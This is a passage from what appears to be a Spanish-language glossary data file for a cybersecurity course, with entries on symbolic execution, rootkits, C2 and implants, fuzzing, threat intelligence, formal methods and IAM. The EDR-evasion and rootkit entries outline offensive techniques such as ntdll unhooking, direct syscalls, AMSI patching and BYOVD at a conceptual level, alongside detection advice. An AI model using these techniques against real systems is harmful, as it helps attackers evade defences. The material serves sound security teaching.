      "En vez de correr el programa con datos concretos, la **ejecución simbólica** trata la entrada como una **variable** y, en cada rama, acumula **restricciones** sobre ella. Un **SMT solver** luego resuelve qué entrada llega a un punto dado — útil para **encontrar bugs** o **resolver retos** automáticamente.\n" +
      "> 💡 Ideal para hallar la entrada que dispara una rama 'oculta' (clave correcta, payload trigger).",
    examples: [
      "Resolver el reto 'introduce la clave correcta' sin reverse manual.",
      "Hallar la entrada que provoca un buffer overflow.",
    ],
    related: ["angr", "Concólica (DSE)", "Aplicaciones y límites del simbólico"],
  },
  {
    id: 791,
    module: 76,
    term: "angr",
    short: "El framework de ejecución simbólica más usado en seguridad — Python, abierto.",
    detail:
      "**angr** es el framework de referencia para análisis simbólico de binarios: carga el binario, simula su CPU y memoria, propaga símbolos y conecta con **Z3** para resolver restricciones. Se usa para CTFs, fuzzing dirigido y vuln research.\n" +
      "import angr\n" +
      "proj = angr.Project('./bin')\n" +
      "sm = proj.factory.simulation_manager(state)\n" +
      "sm.explore(find=0x400abc)",
    examples: [
      "angr explorando hasta una llamada a `puts(\"win\")`.",
      "Resolver un crackme en pocas líneas de Python.",
    ],
    related: ["Ejecución simbólica", "Concólica (DSE)", "Vulnerability research mindset"],
  },
  {
    id: 792,
    module: 76,
    term: "Concólica (DSE)",
    short: "Mezcla 'concreta + simbólica': se ejecuta de verdad y se acumulan restricciones a la vez.",
    detail:
      "La **ejecución concólica** (*concolic = concrete + symbolic*, o **DSE**: Dynamic Symbolic Execution) ejecuta con valores **reales** pero traza simbólicamente las restricciones. Resuelve mejor el problema del **path explosion** y maneja entornos complejos (syscalls, libs externas).\n" +
      "> 💡 Es lo que usan internamente fuzzers modernos (KLEE, SAGE) para dirigir la exploración.",
    examples: [
      "Un fuzzer que usa DSE para inventar entradas que cubran nuevas ramas.",
      "Explorar un binario real (con libc) sin modelar todo simbólicamente.",
    ],
    related: ["Ejecución simbólica", "angr", "Vulnerability research mindset"],
  },
  {
    id: 793,
    module: 76,
    term: "Aplicaciones y límites del simbólico",
    short: "Excelente para retos y código acotado; sufre con criptografía, loops y código enorme.",
    detail:
      "El simbólico/concólico brilla en **vuln research**, **deobfuscación**, **CTFs** y **fuzzing dirigido**. Sus límites: **path explosion** (caminos crecen exponencialmente), **cripto** (las restricciones se vuelven intratables), **loops** sin cota, y **entornos** complejos (sockets, kernel).\n" +
      "> ⚠️ Por eso se combina con fuzzing tradicional, no lo reemplaza.",
    examples: [
      "Resolver un crackme en minutos vs horas de reverse manual.",
      "Renunciar a explorar simbólicamente una rutina de descifrado AES.",
    ],
    related: ["Ejecución simbólica", "Concólica (DSE)", "Fuzzing coverage-guided"],
  },

  // ── M77 · Rootkits y Bootkits ────────────────────────────────────────────
  {
    id: 800,
    module: 77,
    term: "Tipos de rootkit",
    short: "Userland, kernel, hipervisor, firmware: cada nivel da más sigilo y permisos.",
    detail:
      "Un **rootkit** oculta su presencia y la del atacante. Se clasifican por **dónde viven**:\n" +
      "| Nivel | Privilegio | Detección |\n" +
      "|---|---|---|\n" +
      "| Userland | Bajo | Más fácil (EDR lo ve) |\n" +
      "| Kernel | Total | Muy difícil |\n" +
      "| Hipervisor | Sobre el SO | Casi invisible |\n" +
      "| Firmware/UEFI | Pre-SO | Sobrevive al formateo |\n" +
      "> 💡 Cuanto más bajo, más sigiloso — y más caro de desarrollar.",
    examples: [
      "Un LD_PRELOAD trojan (userland) ocultando procesos.",
      "Un bootkit UEFI persistente (LoJax) tras reinstalar el SO.",
    ],
    related: ["Técnicas userland", "Rootkits de kernel", "Bootkits y detección"],
  },
  {
    id: 801,
    module: 77,
    term: "Técnicas userland",
    short: "Hookear funciones de librería: el rootkit vive en cada proceso, sin tocar el kernel.",
    detail:
      "En userland el rootkit intercepta llamadas a **librerías** (libc, ntdll) para ocultar archivos, procesos y conexiones. Vectores: **LD_PRELOAD** (Linux), **DLL injection / hijacking** (Windows), **IAT/EAT hooking**.\n" +
      "> ⚠️ Son los más comunes; un EDR moderno los detecta por sus hooks anómalos.",
    examples: [
      "LD_PRELOAD que sobrescribe `readdir` para ocultar archivos.",
      "Una DLL inyectada en explorer.exe que filtra procesos del Task Manager.",
    ],
    related: ["Tipos de rootkit", "Rootkits de kernel", "Defender, AMSI y ETW"],
  },
  {
    id: 802,
    module: 77,
    term: "Rootkits de kernel",
    short: "Cargar un driver malicioso da control absoluto y ocultación profunda.",
    detail:
      "Un rootkit de **kernel** (módulo o driver firmado) opera en ring 0: modifica la **SSDT** (Windows), engancha syscalls, **DKOM** (Direct Kernel Object Manipulation) para ocultar procesos del propio kernel. Privilegio total y muy difícil de detectar desde userland.\n" +
      "> ⚠️ Windows exige drivers **firmados**; los atacantes recurren a **BYOVD** (Bring Your Own Vulnerable Driver) o roban firmas legítimas.",
    examples: [
      "DKOM para sacar un proceso de la lista del kernel — invisible a `tasklist`.",
      "BYOVD: cargar un driver legítimo vulnerable para escalar a kernel.",
    ],
    related: ["Tipos de rootkit", "Bootkits y detección", "Kernel vs user space"],
  },
  {
    id: 803,
    module: 77,
    term: "Bootkits y detección",
    short: "Infectar el arranque para cargarse antes que el SO; se detectan por measurement/firma.",
    detail:
      "Un **bootkit** infecta el **arranque** (MBR, bootloader, UEFI) para correr **antes que el SO** — el rootkit ideal. Defensa: **Secure Boot** (rechaza firmas no confiables) y **measured boot + TPM** (no impide arrancar, pero la attestation **delata** el cambio).\n" +
      "> 💡 Detectar bootkits desde el SO comprometido es casi imposible: hace falta arrancar desde medios externos o usar attestation.",
    examples: [
      "BlackLotus (2023): primer bootkit UEFI que evade Secure Boot.",
      "Remote attestation que detecta el bootkit comparando PCRs del TPM.",
    ],
    related: ["Rootkits de kernel", "Ataques de firmware", "TPM y attestation"],
  },

  // ── M78 · Implants, C2 y Evasión de EDR ──────────────────────────────────
  {
    id: 810,
    module: 78,
    term: "Implants modernos",
    short: "Beacons sigilosos en memoria, no en disco — eluden el AV clásico.",
    detail:
      "Un **implante** moderno (beacon de Cobalt Strike, Sliver, Mythic) corre **en memoria**, no toca disco, se comunica con su C2 por canales legítimos y **rota** sus huellas. Pequeño, modular, y cargado mediante **shellcode** o **DLL injection** desde un loader.\n" +
      "> 💡 'Beacon' = sigiloso: contacta al C2 cada X minutos con jitter, no en streaming.",
    examples: [
      "Beacon de Cobalt Strike inyectado en explorer.exe vía process hollowing.",
      "Sliver corriendo solo en memoria, sin payload en disco.",
    ],
    related: ["Command and Control (C2)", "Evasión de EDR", "PowerShell ofensivo"],
  },
  {
    id: 811,
    module: 78,
    term: "Evasión de EDR",
    short: "Romper los hooks del EDR sin que se entere: unhook, syscalls directas, parchear ETW/AMSI.",
    detail:
      "Los EDR observan el SO con **hooks** en userland (en ntdll) y **ETW**/**AMSI**. La evasión:\n" +
      "• **Unhooking** — restaurar las bytes originales de ntdll.\n" +
      "• **Direct syscalls** — invocar el kernel saltando ntdll.dll.\n" +
      "• **Patch AMSI/ETW** — neutralizar los pipes de visibilidad.\n" +
      "• **BYOVD** — usar un driver vulnerable para apagar el EDR desde kernel.\n" +
      "> ⚠️ Tamper Protection y soluciones que viven en kernel (no solo userland) frenan muchas de estas técnicas.",
    examples: [
      "Hells Gate para resolver syscalls dinámicamente sin ntdll.",
      "Patch de `AmsiScanBuffer` para que siempre devuelva 'limpio'.",
    ],
    related: ["Implants modernos", "Command and Control (C2)", "Defender, AMSI y ETW"],
  },
  {
    id: 812,
    module: 78,
    term: "Command and Control (C2)",
    short: "El canal por el que el operador habla con el implante — y donde se delata su beaconing.",
    detail:
      "El **C2** orquesta a los implantes. Canales: **HTTP/S** (con dominio fronting o CDN), **DNS** (lento pero sigiloso), **mensajería** (Telegram, Discord). Patrones a detectar: **beaconing** regular, **dominios recién registrados**, **JA3** anómalos, **volumen DNS** elevado.\n" +
      "> 💡 Las **C2 matrices** de MITRE listan canales conocidos; un buen SOC monitorea por patrón, no solo por IoC.",
    examples: [
      "Beacon HTTPS cada 60s a un dominio CDN reciente.",
      "DNS tunneling exfiltrando datos en consultas TXT.",
    ],
    related: ["Implants modernos", "Detección y caza de implantes", "Detección de C2 y exfiltración"],
  },
  {
    id: 813,
    module: 78,
    term: "Detección y caza de implantes",
    short: "Cazar lo que el EDR no vio: anomalías de proceso, memoria y red.",
    detail:
      "Detectar un implante sigiloso exige **hunting**: procesos hijos anómalos de Office/navegador, hilos sin módulo (shellcode en memoria), regiones **RWX** en procesos legítimos, **beaconing** en logs DNS/proxy. Herramientas: **Yara en memoria**, **Sigma**, telemetría de **Sysmon**/EDR.\n" +
      "> 💡 'Inyección de shellcode' deja huellas: regiones de memoria ejecutables sin archivo respaldo, threads sospechosos.",
    examples: [
      "Hunting query: procesos con threads cuyo start address no mapea a ningún módulo.",
      "Yara escaneando memoria para hallar beacons conocidos.",
    ],
    related: ["Command and Control (C2)", "Evasión de EDR", "Threat hunting"],
  },

  // ── M79 · Vulnerability Research y Fuzzing ───────────────────────────────
  {
    id: 820,
    module: 79,
    term: "Vulnerability research mindset",
    short: "Buscar bugs no es solo correr herramientas: es modelar el software y atacar sus suposiciones.",
    detail:
      "El **vulnerability research (VR)** combina lectura de código, **modelado de amenaza** (qué confía el software de qué) y herramientas automatizadas. El investigador busca **suposiciones implícitas** rotas: validaciones que se confunden, estados que se solapan, límites mal puestos.\n" +
      "> 💡 La pregunta clave: ¿qué da por sentado el desarrollador que el atacante puede cambiar?",
    examples: [
      "Hallar un bug de parsing al leer un código auditando suposiciones.",
      "Mapear la superficie de ataque antes de tocar fuzzing.",
    ],
    related: ["Fuzzing coverage-guided", "Fuzzing avanzado", "Triage y ciclo del 0-day"],
  },
  {
    id: 821,
    module: 79,
    term: "Fuzzing coverage-guided",
    short: "Inyecta entradas aleatorias y se guía por la cobertura de código para descubrir caminos nuevos.",
    detail:
      "El **fuzzing moderno** (AFL/AFL++, libFuzzer, honggfuzz) **instrumenta** el binario para medir cobertura: cada entrada que **abre una rama nueva** se guarda y se muta. Así explora el código de forma dirigida, mucho más eficaz que el fuzzing ciego.\n" +
      "afl-fuzz -i seeds/ -o out/ -- ./target @@\n" +
      "> 💡 Es la técnica que destapó miles de CVEs (oss-fuzz lleva ~10.000 bugs en proyectos open source).",
    examples: [
      "AFL++ encontrando un crash en un parser de imágenes.",
      "oss-fuzz integrado en proyectos open source con CI.",
    ],
    related: ["Vulnerability research mindset", "Fuzzing avanzado", "Concólica (DSE)"],
  },
  {
    id: 822,
    module: 79,
    term: "Fuzzing avanzado",
    short: "Diccionarios, harnesses, fuzzing diferencial y feedback de sanitizers para llegar más profundo.",
    detail:
      "Técnicas avanzadas que multiplican la efectividad:\n" +
      "• **Diccionarios y grammars** — para formatos estructurados (JSON, ASN.1).\n" +
      "• **Harnesses** — código que expone la API objetivo al fuzzer.\n" +
      "• **Sanitizers** (**ASan**, **UBSan**, **MSan**) — detectan bugs invisibles al crash.\n" +
      "• **Fuzzing diferencial** — comparar dos implementaciones del mismo protocolo.\n" +
      "• **Snapshot/coverage-guided híbrido** + **concolic** para romper cuellos de botella.",
    examples: [
      "Un harness para fuzzear la librería de parsing TLS.",
      "ASan detectando un heap UAF que el programa no crashea.",
    ],
    related: ["Fuzzing coverage-guided", "Vulnerability research mindset", "Triage y ciclo del 0-day"],
  },
  {
    id: 823,
    module: 79,
    term: "Triage y ciclo del 0-day",
    short: "Del crash al CVE: deduplicar, evaluar explotabilidad, escribir PoC, reportar y publicar.",
    detail:
      "Un crash no es un 0-day; hay que **triagear**: deduplicar (¿es nuevo?), **clasificar** la causa raíz (UAF/OOB/overflow), evaluar **explotabilidad**, escribir un **PoC mínimo**, hacer **disclosure responsable** al vendor y obtener un **CVE**. Solo entonces se publica.\n" +
      "> 💡 Ver el diagrama 'Ciclo del 0-day' con cada etapa y su buena práctica.",
    examples: [
      "Reducir un fuzz crash de 4 MB a un PoC de 200 bytes.",
      "90 días de embargo coordinado antes de publicar el detalle.",
    ],
    related: ["Fuzzing avanzado", "Responsible disclosure", "CVE y CVSS"],
  },

  // ── M80 · Threat Intelligence y APT Tracking ─────────────────────────────
  {
    id: 830,
    module: 80,
    term: "Fundamentos de CTI",
    short: "Convertir datos crudos sobre amenazas en conocimiento que orienta decisiones de defensa.",
    detail:
      "La **Cyber Threat Intelligence** trabaja en 4 niveles:\n" +
      "| Nivel | Audiencia | Contenido |\n" +
      "|---|---|---|\n" +
      "| Estratégico | Dirección | Tendencias, geopolítica |\n" +
      "| Operacional | CISO/Líderes | Campañas específicas |\n" +
      "| Táctico | SOC/IR | TTPs |\n" +
      "| Técnico | Engineers | IoCs |\n" +
      "> 💡 CTI sin acción es solo noticias; debe **mover** detección, parcheo o priorización.",
    examples: [
      "Un reporte que justifica acelerar el parcheo de una CVE.",
      "Boletines de campañas activas contra el sector financiero.",
    ],
    related: ["Frameworks (Diamond, ATT&CK)", "APT tracking", "Operacionalizar (STIX/TAXII)"],
  },
  {
    id: 831,
    module: 80,
    term: "Frameworks (Diamond, ATT&CK)",
    short: "Modelos para describir adversarios: Diamond para atribuir, ATT&CK para mapear TTPs.",
    detail:
      "• **Diamond Model** — describe un evento por 4 vértices: **adversario**, **capacidad** (malware/TTP), **infraestructura** (C2/dominios) y **víctima**. Conectar eventos por vértices compartidos atribuye campañas.\n" +
      "• **MITRE ATT&CK** — catálogo de TTPs por táctica; la lingua franca para mapear detecciones y reportes.\n" +
      "> 💡 Diamond para narrar lo que pasó; ATT&CK para enlazarlo con detección/defensa.",
    examples: [
      "Mapear un IR a ATT&CK para identificar gaps de detección.",
      "Diamond conectando dos incidentes vía la misma infraestructura.",
    ],
    related: ["Fundamentos de CTI", "APT tracking", "MITRE ATT&CK"],
  },
  {
    id: 832,
    module: 80,
    term: "APT tracking",
    short: "Seguir a grupos persistentes: TTPs, infraestructura, motivaciones — más allá del IoC.",
    detail:
      "Los **APT** (*Advanced Persistent Threats*) son grupos organizados (estatales o crimeware) con objetivos sostenidos. El tracking sigue sus **TTPs** (lo más difícil de cambiar — Pirámide del Dolor), su **infraestructura** y sus **víctimas/motivos**. Las atribuciones suelen tener **alias** (APT28/Fancy Bear, Lazarus) y **confianza graduada** (probable, alta).\n" +
      "> ⚠️ Atribuir es difícil: los grupos imitan TTPs ajenos (false flags) para confundir.",
    examples: [
      "Atribuir una campaña a APT41 por el reuso de un loader único.",
      "Compartir IoCs y reportes vía MISP entre equipos.",
    ],
    related: ["Frameworks (Diamond, ATT&CK)", "Operacionalizar (STIX/TAXII)", "Actor de amenaza"],
  },
  {
    id: 833,
    module: 80,
    term: "Operacionalizar (STIX/TAXII)",
    short: "Estándares para compartir CTI máquina-a-máquina: STIX (formato) + TAXII (transporte).",
    detail:
      "• **STIX** — formato JSON estandarizado para describir IoCs, TTPs, actores, malware, relaciones.\n" +
      "• **TAXII** — protocolo HTTPS para distribuir feeds STIX entre organizaciones (consumir/publicar).\n" +
      "• **MISP** — plataforma open source para crear comunidades de intercambio.\n" +
      "> 💡 Sin estándares, cada equipo reinventa el formato; con STIX/TAXII, la CTI fluye automáticamente.",
    examples: [
      "Suscribirse al feed TAXII de un ISAC sectorial.",
      "Publicar un evento MISP con IoCs y TTPs de una campaña.",
    ],
    related: ["Fundamentos de CTI", "APT tracking", "Indicadores de compromiso (IoC)"],
  },

  // ── M81 · Metodología de Security Research ───────────────────────────────
  {
    id: 840,
    module: 81,
    term: "Hacer investigación en seguridad",
    short: "Una mezcla de ingeniería, ciencia y comunicación: hipótesis, experimentación, publicación.",
    detail:
      "La **research** seria es más que 'rompí algo': formular una **pregunta** clara, una **hipótesis** comprobable, experimentar de forma **reproducible**, **medir** y **publicar** con honestidad sobre límites. Combina ingeniería (montar el setup), ciencia (rigor) y comunicación (que se entienda).\n" +
      "> 💡 Pregunta motora: ¿qué afirmación verificable estoy probando o refutando?",
    examples: [
      "Una hipótesis: 'la mitigación X no resiste el ataque Y'.",
      "Reproducir un trabajo publicado para validar sus claims.",
    ],
    related: ["Responsible disclosure", "Ecosistema CVE/CVSS", "Comunicar (papers, PoCs, charlas)"],
  },
  {
    id: 841,
    module: 81,
    term: "Responsible disclosure",
    short: "Avisar al vendor primero, dar tiempo a parchear, publicar coordinado para minimizar daño.",
    detail:
      "El **responsible (coordinated) disclosure** equilibra el derecho del usuario a saber con el riesgo de armar al atacante. El estándar de facto: **90 días** (Google Project Zero) o **45/60/90** según gravedad y respuesta. Si el vendor ignora, se publica igual.\n" +
      "> ⚠️ Lo opuesto: **full disclosure** inmediato (presiona pero pone usuarios en riesgo) o **vender** el bug (gris/negro).",
    examples: [
      "Reportar a security@ del vendor con PoC y deadline.",
      "Coordinar la publicación con el día del parche.",
    ],
    related: ["Hacer investigación en seguridad", "Ecosistema CVE/CVSS", "Triage y ciclo del 0-day"],
  },
  {
    id: 842,
    module: 81,
    term: "Ecosistema CVE/CVSS",
    short: "CVE asigna un id global; CVSS lo puntúa; CNAs emiten los CVEs.",
    detail:
      "Cuando se reporta un bug:\n" +
      "• Un **CNA** (*CVE Numbering Authority*: vendor, MITRE, ZDI) **asigna** un **CVE-YYYY-NNNN**.\n" +
      "• Se calcula un **CVSS** (vector y score 0-10).\n" +
      "• Si está siendo explotado, suele entrar en la **CISA KEV** (Known Exploited Vulnerabilities).\n" +
      "> 💡 Pedir un CVE temprano formaliza el bug y facilita parches/comunicación.",
    examples: [
      "Solicitar un CVE a MITRE si el vendor no es CNA.",
      "Una vuln en KEV pasa al top de la cola de parcheo.",
    ],
    related: ["CVE y CVSS", "Responsible disclosure", "Hacer investigación en seguridad"],
  },
  {
    id: 843,
    module: 81,
    term: "Comunicar (papers, PoCs, charlas)",
    short: "El trabajo no existe hasta que otros pueden leerlo, reproducirlo y construir encima.",
    detail:
      "Vehículos de difusión: **papers académicos** (USENIX, IEEE S&P), **blog posts** técnicos, **PoCs** en GitHub, **charlas** (Black Hat, DEF CON, Offensive Con). El reto es contar **suficiente** para que se entienda y se reproduzca, sin **armar** a actores oportunistas más allá de lo necesario.\n" +
      "> 💡 Un buen writeup explica el camino mental, no solo el exploit.",
    examples: [
      "Un paper con setup reproducible y código publicado.",
      "Un PoC que dispara una alerta pero no daña producción.",
    ],
    related: ["Hacer investigación en seguridad", "Responsible disclosure", "Portfolio y carrera"],
  },

  // ── M82 · Formal Methods y Verificación ──────────────────────────────────
  {
    id: 850,
    module: 82,
    term: "Por qué formal methods",
    short: "Probar matemáticamente que el software cumple una propiedad — no solo testearlo.",
    detail:
      "Los **métodos formales** **demuestran** que un sistema cumple una propiedad (no hay overflow, dos hilos no compiten, el protocolo es seguro). Un test prueba que **un caso** funciona; una prueba formal cubre **todos**. Coste alto, pero invaluable en software crítico (kernels, blockchains, criptografía).\n" +
      "> 💡 Donde un bug cuesta vidas o miles de millones, vale el esfuerzo formal.",
    examples: [
      "El microkernel seL4 con código verificado formalmente.",
      "Demostrar que una implementación de TLS cumple su spec.",
    ],
    related: ["Model checking y theorem proving", "Sistemas verificados", "Límites y práctica"],
  },
  {
    id: 851,
    module: 82,
    term: "Model checking y theorem proving",
    short: "Dos familias: explorar exhaustivamente estados (model checking) o demostrar teoremas paso a paso.",
    detail:
      "• **Model checking** — modela el sistema como estados, explora **todos** y verifica una propiedad (TLA+, SPIN). Automático pero limitado por la **explosión de estados**.\n" +
      "• **Theorem proving** — escribe el sistema y la propiedad en una lógica formal y **demuestra** el teorema con asistente (Coq, Isabelle, Lean). Más general, pero requiere experto y mucho tiempo.\n" +
      "> 💡 Para hardware y protocolos: model checking. Para kernel/compiladores: theorem proving.",
    examples: [
      "Verificar un protocolo distribuido con TLA+ y descubrir un edge case.",
      "Demostrar en Coq que un compilador preserva la semántica.",
    ],
    related: ["Por qué formal methods", "Sistemas verificados", "Ejecución simbólica"],
  },
  {
    id: 852,
    module: 82,
    term: "Sistemas verificados",
    short: "Ejemplos reales donde la verificación formal cambió el listón (seL4, CompCert, AWS).",
    detail:
      "Casos emblemáticos:\n" +
      "• **seL4** — primer microkernel funcionalmente verificado (sin bugs en su código).\n" +
      "• **CompCert** — compilador C cuya traducción está demostrada.\n" +
      "• **AWS** — usa TLA+ y SMT para servicios como S3, DynamoDB; halló bugs profundos antes de producción.\n" +
      "• **Blockchains** — contratos formalmente verificados para evitar pérdidas millonarias.",
    examples: [
      "Amazon describiendo cómo TLA+ encontró bugs en S3 antes de release.",
      "Contratos de DeFi verificados con Certora.",
    ],
    related: ["Por qué formal methods", "Model checking y theorem proving", "Límites y práctica"],
  },
  {
    id: 853,
    module: 82,
    term: "Límites y práctica",
    short: "Coste, expertise y modelado: lo formal no escala a todo — se usa donde el riesgo lo justifica.",
    detail:
      "Los métodos formales tienen **límites duros**: coste de tiempo y de experto, **explosión de estados**, dependencia del **modelo** (si modelas mal, la prueba miente), y la brecha entre la **especificación** y la **implementación**. La práctica es **focalizada**: verificar el corazón crítico (cripto, kernel, protocolo) y testear el resto.\n" +
      "> ⚠️ 'Verificado' no implica 'seguro': la spec puede tener huecos o el modelo asumir cosas falsas.",
    examples: [
      "Verificar solo la rutina de validación de firmas, no todo el sistema.",
      "Un bug fuera de la spec verificada que igual causa una vuln.",
    ],
    related: ["Sistemas verificados", "Por qué formal methods", "Hacer investigación en seguridad"],
  },

  // ── M83 · Gestión de Identidades y Accesos (IAM) ─────────────────────────
  {
    id: 860,
    module: 83,
    term: "Ciclo de vida de la identidad",
    short: "Provisioning, cambios y deprovisioning gobernados — para que cada persona tenga solo lo justo en cada momento.",
    detail:
      "El **ciclo de vida JML** (*Joiner-Mover-Leaver*) gobierna cómo nace, evoluciona y se cierra cada identidad:\n" +
      "• **Joiner** — alta con permisos por rol y MFA configurada.\n" +
      "• **Mover** — al cambiar de rol, **revisar y rotar** permisos (no acumular).\n" +
      "• **Leaver** — deshabilitar/borrar y **revocar tokens/sesiones** rápido.\n" +
      "> ⚠️ Las cuentas 'huérfanas' (ex-empleados activos) y la **acumulación de privilegios** de los movers son hallazgos clásicos de auditoría.",
    examples: [
      "Provisioning automático desde RR.HH. → AD/Okta al alta.",
      "Revisión trimestral de accesos (entitlement review).",
    ],
    related: ["AAA (Autenticación, Autorización, Accounting)", "MFA y autenticación moderna", "Autenticación adaptativa / basada en riesgo", "PAM (Privileged Access Management)"],
  },
  {
    id: 861,
    module: 83,
    term: "MFA y autenticación moderna",
    short: "Más allá de la contraseña: TOTP, push, y passkeys/WebAuthn resistentes al phishing.",
    detail:
      "La **MFA** combina factores: algo que sabes (contraseña), algo que tienes (token, móvil), algo que eres (biometría). No todos son iguales:\n" +
      "| Factor | Resistencia a phishing |\n" +
      "|---|---|\n" +
      "| SMS / Push | Baja (interceptable, fatiga) |\n" +
      "| TOTP (Authenticator) | Media |\n" +
      "| WebAuthn / Passkeys (FIDO2) | Alta (ligado al dominio) |\n" +
      "> 💡 Las **passkeys** son la dirección moderna: criptografía asimétrica, sin contraseña, **inmunes al phishing**.",
    examples: [
      "Migrar de SMS a una app TOTP y luego a passkeys.",
      "MFA push con number matching para mitigar fatiga.",
    ],
    related: ["Factores de autenticación", "Passkeys y FIDO2/WebAuthn", "Autenticación passwordless", "Ataques a MFA", "Ciclo de vida de la identidad", "SSO y federación", "Defensas anti-phishing"],
  },
  {
    id: 862,
    module: 83,
    term: "SSO y federación",
    short: "Una identidad, muchas apps: OAuth/OIDC delegan auth, SAML federa entre dominios.",
    detail:
      "El **SSO** (*Single Sign-On*) deja que el usuario inicie sesión una vez y acceda a muchas apps. Los estándares:\n" +
      "• **OAuth 2.0** — delegación de **autorización** (acceso a recursos).\n" +
      "• **OIDC** — capa de **autenticación** sobre OAuth 2.0; el estándar web moderno.\n" +
      "• **SAML** — federación entre dominios (clásico en empresa).\n" +
      "> 💡 SSO reduce contraseñas reusadas y centraliza la auditoría; el IdP comprometido = todo cae.",
    examples: [
      "Login con Google (OIDC) en una app SaaS.",
      "SAML entre el IdP corporativo y aplicaciones internas.",
    ],
    related: ["MFA y autenticación moderna", "Autenticación passwordless", "Modelos de autorización", "Active Directory: dominio, bosque y OU"],
  },
  {
    id: 863,
    module: 83,
    term: "Modelos de autorización",
    short: "RBAC asigna por rol; ABAC decide por atributos; el menor privilegio es la regla común.",
    detail:
      "• **RBAC** — permisos asignados a **roles**; el usuario hereda los de su rol. Fácil de gobernar, rígido.\n" +
      "• **ABAC** — política basada en **atributos** (usuario, recurso, contexto). Flexible pero más complejo.\n" +
      "• **ReBAC / PBAC** — variantes basadas en relaciones o políticas declarativas (OPA/Cedar).\n" +
      "> 💡 Sea cual sea el modelo, la regla es **menor privilegio**: dar lo mínimo necesario, por el menor tiempo posible. Ver el diagrama 'Modelos de autorización por capas'.",
    examples: [
      "RBAC: rol 'Editor' permite publicar pero no borrar.",
      "ABAC: 'permitir si user.dept == resource.dept y hora ∈ laboral'.",
    ],
    related: ["Principio de mínimo privilegio", "SSO y federación", "PAM (Privileged Access Management)"],
  },
  {
    id: 864,
    module: 83,
    term: "PAM (Privileged Access Management)",
    short: "Custodia y vigila las cuentas con superpoderes: bóvedas, sesiones grabadas, just-in-time.",
    detail:
      "El **PAM** gestiona las **identidades privilegiadas** (admins, service accounts, root). Funciones clave:\n" +
      "• **Bóveda** de credenciales con rotación automática.\n" +
      "• **Just-in-time access** — privilegios temporales por aprobación, no permanentes.\n" +
      "• **Grabación de sesión** para auditoría forense.\n" +
      "• **Aislamiento** — el admin nunca ve la contraseña real.\n" +
      "> ⚠️ Cuentas admin permanentes y compartidas son uno de los riesgos #1 en cualquier auditoría.",
    examples: [
      "Aprobación de 1h para hacerse admin de un servidor.",
      "Rotación automática de la contraseña de una service account.",
    ],
    related: ["Modelos de autorización", "Principio de mínimo privilegio", "Ciclo de vida de la identidad"],
  },
  {
    id: 865,
    module: 83,
    term: "Factores de autenticación",
    short: "Los ingredientes con los que se prueba una identidad: lo que sabes, tienes, eres, dónde estás y cómo te comportas.",
    detail:
      "Un **factor** es una categoría de evidencia con la que un usuario demuestra su identidad. Los cinco factores modernos:\n" +
      "| # | Factor | Ejemplos | Fortaleza típica |\n" +
      "|---|---|---|---|\n" +
      "| 1 | **Conocimiento** — algo que sabes | Contraseña, PIN, respuesta a pregunta | Débil (reusable, phishable) |\n" +
      "| 2 | **Posesión** — algo que tienes | Móvil, token TOTP, llave FIDO2, smart card | Media–alta según el medio |\n" +
      "| 3 | **Inherencia** — algo que eres | Huella, rostro, iris, voz | Media (no revocable) |\n" +
      "| 4 | **Ubicación** — dónde estás | IP corporativa, geofence, red confiable | Contextual (complementaria) |\n" +
      "| 5 | **Comportamiento** — cómo actúas | Ritmo de tecleo, patrón de uso, biometría comportamental | Contextual (continua) |\n" +
      "> 💡 **MFA de verdad** = combinar factores de **categorías distintas** (ej: contraseña + passkey). Dos contraseñas o dos preguntas de seguridad **no es MFA** — es un solo factor repetido.\n" +
      "> ⚠️ Los factores 4 y 5 sostienen la **autenticación adaptativa/continua**, no reemplazan a un factor fuerte de posesión o inherencia en el login inicial.",
    examples: [
      "Contraseña (1) + passkey en el móvil (2) = MFA fuerte y phishing-resistant.",
      "PIN (1) + huella (3) al desbloquear un dispositivo con Windows Hello / Face ID.",
      "Contraseña (1) + geofence corporativo (4) → alto riesgo si el login viene de un país nuevo.",
    ],
    related: ["MFA y autenticación moderna", "AAA (Autenticación, Autorización, Accounting)", "Passkeys y FIDO2/WebAuthn", "Autenticación adaptativa / basada en riesgo"],
  },
  {
    id: 866,
    module: 83,
    term: "Passkeys y FIDO2/WebAuthn",
    short: "Autenticación con criptografía asimétrica ligada al origen: sin secreto compartido, inmune al phishing y a AiTM.",
    detail:
      "Las **passkeys** son credenciales basadas en un par de claves generado por el dispositivo del usuario:\n" +
      "• **Registro** — el dispositivo crea un par (privada + pública). La **privada nunca sale**; la pública se guarda en el servicio.\n" +
      "• **Login** — el servicio manda un *challenge*; el dispositivo lo firma con la privada; el servicio verifica con la pública.\n" +
      "• **Ligadura al origen** — la credencial está atada al dominio (`example.com`). Un dominio phishing (`examp1e.com`) no puede reutilizarla.\n" +
      "• **WebAuthn** (W3C) es la API del navegador; **FIDO2** (Alianza FIDO) el stack completo (CTAP2 + WebAuthn).\n" +
      "\n**Variantes:**\n" +
      "| Tipo | Sincronización | Recuperación | Uso |\n" +
      "|---|---|---|---|\n" +
      "| **Sync passkeys** | iCloud Keychain / Google / 1Password | Alta (backup en la nube) | Consumer |\n" +
      "| **Device-bound** | No sale del dispositivo | Baja (requiere segunda credencial) | Empresa / alto riesgo |\n" +
      "| **Attestation** | El servicio verifica el fabricante | — | Regulado (banca, gobierno) |\n" +
      "> 💡 Son la **única MFA con inmunidad demostrada** a **adversary-in-the-middle** (evilginx/Modlishka): el proxy no puede reproducir la firma porque el origen no coincide.",
    examples: [
      "Login con passkey en Google, GitHub o Apple: ni contraseña ni OTP, solo Face ID / huella.",
      "YubiKey (device-bound FIDO2) como segundo factor obligatorio para admins.",
      "Enterprise attestation: exigir passkeys emitidas por un fabricante certificado.",
    ],
    related: ["MFA y autenticación moderna", "Factores de autenticación", "Autenticación passwordless", "Ataques a MFA", "Cifrado asimétrico y par de claves"],
  },
  {
    id: 867,
    module: 83,
    term: "Autenticación passwordless",
    short: "Login sin contraseña reusable: passkeys, magic links, biometría o push verificado — más UX y menos superficie robable.",
    detail:
      "**Passwordless** significa eliminar el secreto memorizable como credencial primaria. Las vías principales:\n" +
      "• **Passkeys / FIDO2** — la referencia moderna: clave asimétrica, sin secreto compartido, phishing-resistant.\n" +
      "• **Magic links** — enlace único enviado por email; útil como fallback, débil como único método (depende del canal email).\n" +
      "• **One-tap push** con *number matching* — el servicio muestra un número; el usuario lo confirma en la app. Mitiga MFA fatigue.\n" +
      "• **Biometría local** — huella o cara desbloquean una clave local; el secreto **nunca deja el dispositivo**.\n" +
